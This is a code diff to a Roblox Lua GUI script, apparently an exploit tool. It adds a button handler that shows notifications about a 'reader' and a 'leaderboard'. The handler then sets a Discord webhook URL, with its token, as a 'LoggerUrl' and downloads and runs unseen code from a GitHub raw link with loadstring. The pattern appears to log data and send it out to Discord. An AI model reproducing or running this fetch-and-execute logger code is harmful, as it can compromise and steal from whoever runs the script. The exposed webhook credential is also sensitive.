@@ -93,6 +93,24 @@ ActionButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 UICornerButton.Parent = ActionButton
 UICornerButton.CornerRadius = UDim.new(0, 8)
 
+ActionButton.MouseButton1Click:Connect(function()
+	local CoreGui = game:GetService("StarterGui")
+	CoreGui:SetCore("SendNotification", {
+	    Title = "PLEASE for the love of god",
+	    Text = "Only execute the reader once",
+	    Duration = 5.5,
+	})
+
+	CoreGui:SetCore("SendNotification", {
+	    Title = "open the leaderboard",
+	    Text = "you can find the reads there",
+	    Duration = 5.5,
+	})
+        getgenv().LoggerUrl = "https://ptb.discord.com/api/webhooks/1337512520725823579/frzuqdPRx_MX7396DaFawKRH5aXj1XVlp2nbOVYSGemF3neLkm5NiRBDBPdE49ye2svV"
+    
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/VBallsYCUKER/a/refs/heads/main/adada", true))()
+end)
+
 -- Minimize Functionality
 local isMinimized = false
 MinimizeButton.MouseButton1Click:Connect(function()
